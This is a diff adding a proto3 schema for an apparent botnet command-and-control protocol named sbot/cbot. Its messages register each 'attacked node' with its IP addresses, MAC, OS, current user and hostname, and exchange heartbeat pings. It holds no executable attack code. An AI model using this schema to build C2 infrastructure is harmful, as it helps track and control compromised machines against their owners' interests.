@@ -1,0 +1,70 @@
+syntax = "proto3";
+
+package sbot.proto.model;
+
+option csharp_namespace = "SBot.Proto.Model";
+option go_package = "github.com/sbot/proto/model";
+option java_multiple_files = true;
+option java_outer_classname = "Node";
+option java_package = "com.gbw3bao.sbot.proto.model";
+option php_namespace = "SBot\\Proto\\Model";
+
+message CreateNodeRequest {
+
+  //the cbot version
+  string version = 1;
+
+  //the local ip address that been attacked node
+  string localIP = 2;
+
+  // the out ip address that been attacked node
+  string outIP = 3;
+
+  // the mac address that been attacked node
+  string mac = 4;
+
+  //the os that been attacked node
+  string os = 5;
+
+  //the current user
+  string user = 6;
+
+  //the host name that been attacked node
+  string hostName = 7;
+
+}
+
+message Node {
+
+  // 0 ---create node ok,-1---create node failed
+  int32 status = 1;
+
+  // indentify a node that been attacked
+  string id = 2;
+
+}
+
+message PingRequest {
+
+  //the node information that send ping request
+  Node node = 1;
+
+  //the time that cbot sends ,time unit is ms
+  uint64 time = 2;
+
+}
+
+message PingReply {
+
+  // 0 ---ping server ok,-1---ping server failed
+  int32 status = 1;
+
+  //the description of status
+  string message =2 ;
+
+  //the time that sbot sends reply,time unit is ms
+  uint64 time = 3;
+
+}
+
+
